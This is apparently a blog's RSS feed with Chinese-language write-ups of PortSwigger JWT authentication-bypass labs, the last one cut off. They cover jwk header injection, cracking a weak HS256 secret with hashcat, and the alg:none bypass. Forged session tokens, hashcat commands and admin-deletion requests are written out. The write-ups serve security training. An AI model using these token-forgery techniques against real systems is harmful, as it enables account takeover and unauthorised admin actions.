<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Jwt on en1r0py</title><link>/tags/jwt/</link><description>Recent content in Jwt on en1r0py</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Fri, 27 Dec 2024 23:40:23 +0800</lastBuildDate><atom:link href="/tags/jwt/index.xml" rel="self" type="application/rss+xml"/><item><title>Lab: JWT authentication bypass via jwk header injection</title><link>/portswigger-posts/jwt-lab-jwt-authentication-bypass-via-jwk-header-injection/</link><pubDate>Fri, 27 Dec 2024 23:40:23 +0800</pubDate><guid>/portswigger-posts/jwt-lab-jwt-authentication-bypass-via-jwk-header-injection/</guid><description>Lab description Solution 点击右上角My account并使用wiener:peter登录 登录后跳转至个人页面，请求如下 GET /my-account?id=wiener HTTP/2 Cookie: session=eyJraWQiOiI2YTAzNmViNC1iOThmLTRmMWUtYmNhMS1iNjQ3YjYwMmVhMzQiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxODc2Mywic3ViIjoid2llbmVyIn0.QFZHCuPIeQOqOsCVjDSqbqiVDBunwQYEIZOTS8AnqF_A4JpCjL7V77MQeulXTSJXQVK41yOS2XVMDQsc9pCYC1bx6Wv35NjgNC4xoKJaqUjv0hbaxtYwaoDIiLWXP_5kwxYf2SBGgMZZXarIsw6p_JNQgeRKw3NwopuhQo1dm55_FJCppCJ2UfNs-gjhjUIQJNpMbk3jHfTCJtLGt6kofSR3qp1VCaPoDxSS9goF-13sipq7ttvz8Lyuc2uiKoniHaBF8OespKMkP0HYRxg8HURUvwmxt1C2lwvb6lz4QIBzbyGFaJZvpH2sPPUmzYW4Vy5qbfDThBp3L6rM_klrPw 通过JWT Editor生成一对新的RSA密钥对，点击JWT Editor、New RSA key 将步骤2的请求发送至Burp Repeater，并点击JSON Web Token分页 将JWT payload中的sub从wiener修改为administrator 点击下方Attack、Embedded JWK，并选择步骤4所新增的RSA密钥对 在JWT header中已添加了一个包含新增公钥的jwk参数 发送修改JWT后的请求，并修改url为/admin GET /admin HTTP/2 Cookie: session=eyJraWQiOiI5ZWE0ODhhYi04MGU0LTQ2NjgtYjAyZC0zZDBhOTllYmFlY2YiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjllYTQ4OGFiLTgwZTQtNDY2OC1iMDJkLTNkMGE5OWViYWVjZiIsIm4iOiJ1S0dlbXlVMkZPb190ZXljUnphYkoyTWhUbkVJRDdFVWJoX2ZvdURyRU14S2ZnQzFfRV9ka3BqZ0FpbzFzMXV3QjBLaWx5ck0zTEg5cUQ0R2hLczVvUHQzb3V1VTVBamJ1bi1TTG1Xd0F5cXV6U2ZvZU5JSW5HR2JFeXU3ZENucGpRb3NJMXhEbHF3b1pQQVV3S3FidGh3NDZDcm54SmpBR1Vmcl90RzdnNFl3X3M1RC1zNmJBU3NxU0dKZWFVeXQ0UTF4WXV0VnN0RzdfNEVDQ0hXZF9jMTVIdDhVekk3VE5EaWsxUTkxREk2SF9wcVg1VGlRZmVYaXJXdGd6U2s1VXVPYU1TTjZCTFM4dmtaWUhrRnB5TktKSWNwZEpmcnMwMzVYQ0xuUE5MbXkzM2FQTElmeVJhVFdPc0s3a2pmOGVrWS1LcUJKQkVmcWlCSDBMZE5vVVEifX0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxODc2Mywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.uJx5uzr5ehWN22wY8AmWV8Rb5ZP1yZxyYXrRFPBb2rCd-rVnXKvARF9d6BbyOb9xADVCnxyEK5P5I5F5MP5qL_rioisbnzezckGs32XyeR2_0NRTB76iZnhYw7zBnLbyHFKUGqGycKvsnKmxG5cUVTdE-2buLUTThxOjgaM1B0keKL2Crw6woqNaeX1d2QSLRVX-i9NHyDj_UMCoOiKkL35LAoTiBV4-JUH90IFBrYvzTm21mPl3tROiwxEb7POyUZVC7IWQ08LaH8XgCyQwB14XSCnwnHuqzLS2QG1-U5TPkhCYthFVXteyEm4TiYF0PDSampFAsYcLibq2veda2A HTTP/2 200 OK &amp;lt;div&amp;gt; &amp;lt;span&amp;gt;carlos - &amp;lt;/span&amp;gt; &amp;lt;a href=&amp;#34;/admin/delete?username=carlos&amp;#34;&amp;gt;Delete&amp;lt;/a&amp;gt; &amp;lt;/div&amp;gt; 修改上述请求url为/admin/delete?username=carlos并且再次发送请求，即可解题 GET /admin/delete?username=carlos HTTP/2 Cookie: session=eyJraWQiOiI5ZWE0ODhhYi04MGU0LTQ2NjgtYjAyZC0zZDBhOTllYmFlY2YiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjllYTQ4OGFiLTgwZTQtNDY2OC1iMDJkLTNkMGE5OWViYWVjZiIsIm4iOiJ1S0dlbXlVMkZPb190ZXljUnphYkoyTWhUbkVJRDdFVWJoX2ZvdURyRU14S2ZnQzFfRV9ka3BqZ0FpbzFzMXV3QjBLaWx5ck0zTEg5cUQ0R2hLczVvUHQzb3V1VTVBamJ1bi1TTG1Xd0F5cXV6U2ZvZU5JSW5HR2JFeXU3ZENucGpRb3NJMXhEbHF3b1pQQVV3S3FidGh3NDZDcm54SmpBR1Vmcl90RzdnNFl3X3M1RC1zNmJBU3NxU0dKZWFVeXQ0UTF4WXV0VnN0RzdfNEVDQ0hXZF9jMTVIdDhVekk3VE5EaWsxUTkxREk2SF9wcVg1VGlRZmVYaXJXdGd6U2s1VXVPYU1TTjZCTFM4dmtaWUhrRnB5TktKSWNwZEpmcnMwMzVYQ0xuUE5MbXkzM2FQTElmeVJhVFdPc0s3a2pmOGVrWS1LcUJKQkVmcWlCSDBMZE5vVVEifX0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxODc2Mywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.uJx5uzr5ehWN22wY8AmWV8Rb5ZP1yZxyYXrRFPBb2rCd-rVnXKvARF9d6BbyOb9xADVCnxyEK5P5I5F5MP5qL_rioisbnzezckGs32XyeR2_0NRTB76iZnhYw7zBnLbyHFKUGqGycKvsnKmxG5cUVTdE-2buLUTThxOjgaM1B0keKL2Crw6woqNaeX1d2QSLRVX-i9NHyDj_UMCoOiKkL35LAoTiBV4-JUH90IFBrYvzTm21mPl3tROiwxEb7POyUZVC7IWQ08LaH8XgCyQwB14XSCnwnHuqzLS2QG1-U5TPkhCYthFVXteyEm4TiYF0PDSampFAsYcLibq2veda2A HTTP/2 302 Found</description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-jwk-header-injection-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击右上角&lt;code>My account&lt;/code>并使用&lt;code>wiener:peter&lt;/code>登录&lt;/li>
&lt;li>登录后跳转至个人页面，请求如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /my-account?id=wiener &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=eyJraWQiOiI2YTAzNmViNC1iOThmLTRmMWUtYmNhMS1iNjQ3YjYwMmVhMzQiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxODc2Mywic3ViIjoid2llbmVyIn0.QFZHCuPIeQOqOsCVjDSqbqiVDBunwQYEIZOTS8AnqF_A4JpCjL7V77MQeulXTSJXQVK41yOS2XVMDQsc9pCYC1bx6Wv35NjgNC4xoKJaqUjv0hbaxtYwaoDIiLWXP_5kwxYf2SBGgMZZXarIsw6p_JNQgeRKw3NwopuhQo1dm55_FJCppCJ2UfNs-gjhjUIQJNpMbk3jHfTCJtLGt6kofSR3qp1VCaPoDxSS9goF-13sipq7ttvz8Lyuc2uiKoniHaBF8OespKMkP0HYRxg8HURUvwmxt1C2lwvb6lz4QIBzbyGFaJZvpH2sPPUmzYW4Vy5qbfDThBp3L6rM_klrPw&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>通过&lt;a href="https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd">JWT Editor&lt;/a>生成一对新的RSA密钥对，点击&lt;code>JWT Editor&lt;/code>、&lt;code>New RSA key&lt;/code>
&lt;img alt="New RSA key" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-jwk-header-injection-2.jpg">
&lt;img alt="New RSA key" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-jwk-header-injection-3.jpg">&lt;/li>
&lt;li>将步骤2的请求发送至Burp Repeater，并点击JSON Web Token分页
&lt;img alt="JSON Web Token" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-jwk-header-injection-4.jpg">&lt;/li>
&lt;li>将&lt;code>JWT payload&lt;/code>中的&lt;code>sub&lt;/code>从&lt;code>wiener&lt;/code>修改为&lt;code>administrator&lt;/code>
&lt;img alt="JSON Web Token" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-jwk-header-injection-5.jpg">&lt;/li>
&lt;li>点击下方&lt;code>Attack&lt;/code>、&lt;code>Embedded JWK&lt;/code>，并选择步骤4所新增的RSA密钥对
&lt;img alt="Embedded JWK" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-jwk-header-injection-6.jpg">&lt;/li>
&lt;li>在&lt;code>JWT header&lt;/code>中已添加了一个包含新增公钥的jwk参数
&lt;img alt="Embedded JWK" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-jwk-header-injection-7.jpg">&lt;/li>
&lt;li>发送修改JWT后的请求，并修改url为&lt;code>/admin&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=eyJraWQiOiI5ZWE0ODhhYi04MGU0LTQ2NjgtYjAyZC0zZDBhOTllYmFlY2YiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjllYTQ4OGFiLTgwZTQtNDY2OC1iMDJkLTNkMGE5OWViYWVjZiIsIm4iOiJ1S0dlbXlVMkZPb190ZXljUnphYkoyTWhUbkVJRDdFVWJoX2ZvdURyRU14S2ZnQzFfRV9ka3BqZ0FpbzFzMXV3QjBLaWx5ck0zTEg5cUQ0R2hLczVvUHQzb3V1VTVBamJ1bi1TTG1Xd0F5cXV6U2ZvZU5JSW5HR2JFeXU3ZENucGpRb3NJMXhEbHF3b1pQQVV3S3FidGh3NDZDcm54SmpBR1Vmcl90RzdnNFl3X3M1RC1zNmJBU3NxU0dKZWFVeXQ0UTF4WXV0VnN0RzdfNEVDQ0hXZF9jMTVIdDhVekk3VE5EaWsxUTkxREk2SF9wcVg1VGlRZmVYaXJXdGd6U2s1VXVPYU1TTjZCTFM4dmtaWUhrRnB5TktKSWNwZEpmcnMwMzVYQ0xuUE5MbXkzM2FQTElmeVJhVFdPc0s3a2pmOGVrWS1LcUJKQkVmcWlCSDBMZE5vVVEifX0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxODc2Mywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.uJx5uzr5ehWN22wY8AmWV8Rb5ZP1yZxyYXrRFPBb2rCd-rVnXKvARF9d6BbyOb9xADVCnxyEK5P5I5F5MP5qL_rioisbnzezckGs32XyeR2_0NRTB76iZnhYw7zBnLbyHFKUGqGycKvsnKmxG5cUVTdE-2buLUTThxOjgaM1B0keKL2Crw6woqNaeX1d2QSLRVX-i9NHyDj_UMCoOiKkL35LAoTiBV4-JUH90IFBrYvzTm21mPl3tROiwxEb7POyUZVC7IWQ08LaH8XgCyQwB14XSCnwnHuqzLS2QG1-U5TPkhCYthFVXteyEm4TiYF0PDSampFAsYcLibq2veda2A&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;div&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;span&amp;gt;carlos - &amp;lt;/span&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;a href=&amp;#34;/admin/delete?username=carlos&amp;#34;&amp;gt;Delete&amp;lt;/a&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/div&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>修改上述请求url为&lt;code>/admin/delete?username=carlos&lt;/code>并且再次发送请求，即可解题
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin/delete?username=carlos &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=eyJraWQiOiI5ZWE0ODhhYi04MGU0LTQ2NjgtYjAyZC0zZDBhOTllYmFlY2YiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjllYTQ4OGFiLTgwZTQtNDY2OC1iMDJkLTNkMGE5OWViYWVjZiIsIm4iOiJ1S0dlbXlVMkZPb190ZXljUnphYkoyTWhUbkVJRDdFVWJoX2ZvdURyRU14S2ZnQzFfRV9ka3BqZ0FpbzFzMXV3QjBLaWx5ck0zTEg5cUQ0R2hLczVvUHQzb3V1VTVBamJ1bi1TTG1Xd0F5cXV6U2ZvZU5JSW5HR2JFeXU3ZENucGpRb3NJMXhEbHF3b1pQQVV3S3FidGh3NDZDcm54SmpBR1Vmcl90RzdnNFl3X3M1RC1zNmJBU3NxU0dKZWFVeXQ0UTF4WXV0VnN0RzdfNEVDQ0hXZF9jMTVIdDhVekk3VE5EaWsxUTkxREk2SF9wcVg1VGlRZmVYaXJXdGd6U2s1VXVPYU1TTjZCTFM4dmtaWUhrRnB5TktKSWNwZEpmcnMwMzVYQ0xuUE5MbXkzM2FQTElmeVJhVFdPc0s3a2pmOGVrWS1LcUJKQkVmcWlCSDBMZE5vVVEifX0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxODc2Mywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.uJx5uzr5ehWN22wY8AmWV8Rb5ZP1yZxyYXrRFPBb2rCd-rVnXKvARF9d6BbyOb9xADVCnxyEK5P5I5F5MP5qL_rioisbnzezckGs32XyeR2_0NRTB76iZnhYw7zBnLbyHFKUGqGycKvsnKmxG5cUVTdE-2buLUTThxOjgaM1B0keKL2Crw6woqNaeX1d2QSLRVX-i9NHyDj_UMCoOiKkL35LAoTiBV4-JUH90IFBrYvzTm21mPl3tROiwxEb7POyUZVC7IWQ08LaH8XgCyQwB14XSCnwnHuqzLS2QG1-U5TPkhCYthFVXteyEm4TiYF0PDSampFAsYcLibq2veda2A&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></content></item><item><title>Lab: JWT authentication bypass via weak signing key</title><link>/portswigger-posts/jwt-lab-jwt-authentication-bypass-via-weak-signing-key/</link><pubDate>Fri, 27 Dec 2024 21:33:04 +0800</pubDate><guid>/portswigger-posts/jwt-lab-jwt-authentication-bypass-via-weak-signing-key/</guid><description>Lab description Solution 点击右上角My account并使用wiener:peter登录 登录后跳转至个人页面，请求如下 GET /my-account?id=wiener HTTP/2 Cookie: session=eyJraWQiOiIyNmIwZjQzYy1hZDhiLTQ1OTQtYjFiNC02NWZlZDYwMTYxYjgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxNjQ3Nywic3ViIjoid2llbmVyIn0.892fbasPXIbgCheJYfaLEcam5WlhWqdHIEts_piqbqo 根据题目提示，使用hashcat与wordlist of common secrets暴力破解jwt密钥 $ hashcat -a 0 -m 16500 eyJraWQiOiIyNmIwZjQzYy1hZDhiLTQ1OTQtYjFiNC02NWZlZDYwMTYxYjgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxNjQ3Nywic3ViIjoid2llbmVyIn0.892fbasPXIbgCheJYfaLEcam5WlhWqdHIEts_piqbqo /tmp/jwt.secrets.list ... :secret1 根据hashcat爆破结果密钥为secret1 使用jwt.io修改JWT payload中的sub，首先填入your-256-bit-secret为secret1 修改JWT payload中的sub为administrator 重放步骤2请求，填入修改后的JWT，并修改url为/admin GET /admin HTTP/2 Cookie: session=eyJraWQiOiIyNmIwZjQzYy1hZDhiLTQ1OTQtYjFiNC02NWZlZDYwMTYxYjgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxNjQ3Nywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.Ip0VbwwneBvqHD5O0ff0wE0Hpobf5NWIHy2g6wAKxJg HTTP/2 200 OK &amp;lt;div&amp;gt; &amp;lt;span&amp;gt;carlos - &amp;lt;/span&amp;gt; &amp;lt;a href=&amp;#34;/admin/delete?username=carlos&amp;#34;&amp;gt;Delete&amp;lt;/a&amp;gt; &amp;lt;/div&amp;gt; 修改上述请求url为/admin/delete?username=carlos并且再次发送请求，即可解题 GET /admin/delete?username=carlos HTTP/2 Cookie: session=eyJraWQiOiIyNmIwZjQzYy1hZDhiLTQ1OTQtYjFiNC02NWZlZDYwMTYxYjgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxNjQ3Nywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.Ip0VbwwneBvqHD5O0ff0wE0Hpobf5NWIHy2g6wAKxJg HTTP/2 302 Found</description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-weak-signing-key-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击右上角&lt;code>My account&lt;/code>并使用&lt;code>wiener:peter&lt;/code>登录&lt;/li>
&lt;li>登录后跳转至个人页面，请求如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /my-account?id=wiener &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=eyJraWQiOiIyNmIwZjQzYy1hZDhiLTQ1OTQtYjFiNC02NWZlZDYwMTYxYjgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxNjQ3Nywic3ViIjoid2llbmVyIn0.892fbasPXIbgCheJYfaLEcam5WlhWqdHIEts_piqbqo&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>根据题目提示，使用&lt;a href="https://hashcat.net/hashcat/">hashcat&lt;/a>与&lt;a href="https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list">wordlist of common secrets&lt;/a>暴力破解jwt密钥
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ hashcat -a &lt;span style="color:#ae81ff">0&lt;/span> -m &lt;span style="color:#ae81ff">16500&lt;/span> eyJraWQiOiIyNmIwZjQzYy1hZDhiLTQ1OTQtYjFiNC02NWZlZDYwMTYxYjgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxNjQ3Nywic3ViIjoid2llbmVyIn0.892fbasPXIbgCheJYfaLEcam5WlhWqdHIEts_piqbqo /tmp/jwt.secrets.list
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>... :secret1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>根据&lt;code>hashcat&lt;/code>爆破结果密钥为&lt;code>secret1&lt;/code>&lt;/li>
&lt;li>使用&lt;a href="https://jwt.io/">jwt.io&lt;/a>修改&lt;code>JWT payload&lt;/code>中的&lt;code>sub&lt;/code>，首先填入&lt;code>your-256-bit-secret&lt;/code>为&lt;code>secret1&lt;/code>
&lt;img alt="Edit jwt" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-weak-signing-key-2.jpg">&lt;/li>
&lt;li>修改&lt;code>JWT payload&lt;/code>中的&lt;code>sub&lt;/code>为&lt;code>administrator&lt;/code>
&lt;img alt="Edit jwt" src="/img/2024/jwt-lab-jwt-authentication-bypass-via-weak-signing-key-3.jpg">&lt;/li>
&lt;li>重放步骤2请求，填入修改后的JWT，并修改url为&lt;code>/admin&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=eyJraWQiOiIyNmIwZjQzYy1hZDhiLTQ1OTQtYjFiNC02NWZlZDYwMTYxYjgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxNjQ3Nywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.Ip0VbwwneBvqHD5O0ff0wE0Hpobf5NWIHy2g6wAKxJg&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;div&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;span&amp;gt;carlos - &amp;lt;/span&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;a href=&amp;#34;/admin/delete?username=carlos&amp;#34;&amp;gt;Delete&amp;lt;/a&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/div&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>修改上述请求url为&lt;code>/admin/delete?username=carlos&lt;/code>并且再次发送请求，即可解题
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin/delete?username=carlos &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=eyJraWQiOiIyNmIwZjQzYy1hZDhiLTQ1OTQtYjFiNC02NWZlZDYwMTYxYjgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTMxNjQ3Nywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.Ip0VbwwneBvqHD5O0ff0wE0Hpobf5NWIHy2g6wAKxJg&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></content></item><item><title>Lab: JWT authentication bypass via flawed signature verification</title><link>/portswigger-posts/jwt-lab-jwt-authentication-bypass-via-flawed-signature-verification/</link><pubDate>Thu, 26 Dec 2024 23:25:54 +0800</pubDate><guid>/portswigger-posts/jwt-lab-jwt-authentication-bypass-via-flawed-signature-verification/</guid><description>Lab description Solution 点击右上角My account并使用wiener:peter登录 登录后跳转至个人页面，请求如下 GET /my-account?id=wiener HTTP/2 Cookie: session=eyJraWQiOiI5ZDgzYzk5ZC03MDQyLTQxOTYtYTY0Ny1mZWE5MjUzNmY5NjQiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTIzMDYyOCwic3ViIjoid2llbmVyIn0.WDgCWkjhNJTKUUWQXtSWZeNvucgq3tI2jolposyLR_6Wb1oalFTHet06RriaBSNRg9L_ymsEKBLggXXHuMiTxYSGIS6WkKbEPuu7RvwXQOvWG2lLOrtB5nGF50qBY1Byw7OLEyzDsij1mkLcHhy8b5limYlHOprtOnlX8J8zST2G1aG6esITtWEuJjHPaNrCnOHgVSaFzr4RpW0fd1P6kGzin47G71MqsCwOueH7DHn2_ySnX0Wkw_Ehwkd_EMjcAmT-l-ecD3jsFBaaIOna0HtLntFf7eRT3CdXLEHmwkTmewAjrHTgV8e1CcpiAXcEFdQuXxU4pYF0yBXvwIpDeg 将JWT header中的alg从RS256修改为none并点击Apply changes 将JWT payload中的sub从wiener修改为administrator并点击Apply changes 将JWT signature删除 将url修改为/admin，在浏览器开启请求即可看见Admin panel 将上述url修改为/admin/delete?username=carlos并再次在浏览器开启请求即可解题</description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
